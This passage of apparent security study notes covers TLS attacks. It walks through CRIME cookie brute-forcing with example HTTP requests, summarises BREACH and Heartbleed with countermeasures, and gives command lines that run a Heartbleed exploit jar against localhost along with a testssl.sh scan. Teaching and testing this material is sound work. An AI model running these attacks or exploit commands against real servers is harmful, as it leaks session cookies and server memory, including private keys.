The attacker then forces the victim to request the target website but
 appends an extra HTTP parameter to the URL with the same name as the 
session cookie and an arbitrary value with the correct length. An 
exemplary request could look like this:

Code: http

```
GET /crime.html?sess=XXXXXX HTTP/1.1
Host: crime.local
Cookie: sess=abcdef

```

This request is now compressed using a sliding window compression algorithm, meaning that the `sess=` string present in the `Cookie` Header is replaced with a back-reference to the `sess=`
 string appended by the attacker to the query string. The compressed 
data is then encrypted. Since the attacker can intercept the ciphertext,
 he denotes the ciphertext size.

In the second step, the attacker changes the query parameter slightly
 to brute-force the value of the session cookie character by character 
from left to right.  So, the next request might look like this:

Code: http

```
GET /crime.html?sess=aXXXXX HTTP/1.1
Host: crime.local
Cookie: sess=abcdef

```

In this case, the compression algorithm can now replace the string `sess=a`
 with a back-reference, since an additional character is the same in the
 cookie's value and query string. This means the resulting compressed 
data is smaller, potentially resulting in a smaller ciphertext. The 
attacker notices the smaller ciphertext and knows that the current 
character is correct. He can therefore move on to the next character:

Code: http

```
GET /crime.html?sess=aaXXXX HTTP/1.1
Host: crime.local
Cookie: sess=abcdef

```

The attacker can apply this technique recursively to brute-force all 
characters of the cookie, thereby leaking the session cookie. Depending 
on the length of the session cookie, a lot of requests are required to 
perform this attack.

---

### BREACH

[Browser Reconnaissance and Exfiltration via Adaptive Compression of Hypertext (BREACH)](https://breachattack.com/)
 is a variant of CRIME that targets HTTP-level compression. Since 
HTTP-level compression can only compress the HTTP body, BREACH is unable
 to target session cookies that are transmitted in HTTP headers. 
Therefore, potential targets of BREACH are sensitive information 
contained in the HTTP body such as CSRF-tokens.

Conceptually, BREACH works identically to CRIME with the slight 
difference that the webserver's response needs to contain a reflected 
value in the body for the attack to work since the attacker cannot 
simply adjust the query string as it is not part of the HTTP body.

---

### Tools & Prevention

The simplest countermeasure to prevent CRIME attacks is to disable 
TLS-level compression. Alternatively, compression algorithms that do not
 fulfill the requirements needed for the successful exploitation of 
CRIME can be used to mitigate this attack. As of today, up-to-date 
webservers and libraries are not vulnerable to CRIME as patches have 
been applied.

Similarly, the simplest countermeasure to prevent BREACH attacks is to disable HTTP-level compression.

## The Heartbleed Bug

- **TLS Heartbeat extension:** Keeps connections alive by sending a request and receiving the same payload back.
- **Vulnerability (Heartbleed):**
    - OpenSSL failed to validate the **payload length**.
    - Malicious clients could request more data than sent.
    - Server would leak memory contents in its response.
- **Impact:** Memory leaks could expose sensitive data, including **private keys**.
- **Severity:** Heartbeat was enabled by default → millions of servers affected → massive security crisis.

### **Tools & Prevention**

```python
java -jar apps/heartbleed-1.0.1.jar -h

java -jar heartbleed-1.0.1.jar -connect 127.0.0.1:443

java -jar heartbleed-1.0.1.jar -connect 127.0.0.1:443 -executeAttack -heartbeats 10 -heartbeats 10
```

## Testing TLS Configuration

[https://github.com/drwetter/testssl.sh](https://github.com/drwetter/testssl.sh)

```python
bash testssl.sh https://hackthebox.com
```

## Sources
- `_raw/Web attacks/Web Attacks/HTTP Attacks/TLS-Attacks/PKI.md`
- `_raw/Web attacks/Web Attacks/HTTP Attacks/TLS-Attacks/TLS 1 2 Handshake.md`
- `_raw/Web attacks/Web Attacks/HTTP Attacks/TLS-Attacks/TLS 1 3.md`
- `_raw/Web attacks/Web Attacks/HTTP Attacks/TLS-Attacks/Cryptographic Atks.md`
- `_raw/Web attacks/Web Attacks/HTTP Attacks/TLS-Attacks/SSL Stripping.md`
- `_raw/Web attacks/Web Attacks/HTTP Attacks/TLS-Attacks/Compression.md`
- `_raw/Web attacks/Web Attacks/HTTP Attacks/TLS-Attacks/Downgrade Attacks.md`
- `_raw/Web attacks/Web Attacks/HTTP Attacks/TLS-Attacks/Padding Oracles.md`
- `_raw/Web attacks/Web Attacks/HTTP Attacks/TLS-Attacks/POODLE & BEAST.md`
- `_raw/Web attacks/Web Attacks/HTTP Attacks/TLS-Attacks/Bleichenbacher & DROWN.md`
- `_raw/Web attacks/Web Attacks/HTTP Attacks/TLS-Attacks/CRIME & BREACH.md`
- `_raw/Web attacks/Web Attacks/HTTP Attacks/TLS-Attacks/The Heartbleed Bug.md`
- `_raw/Web attacks/Web Attacks/HTTP Attacks/TLS-Attacks/Testing TLS Configuration.md`
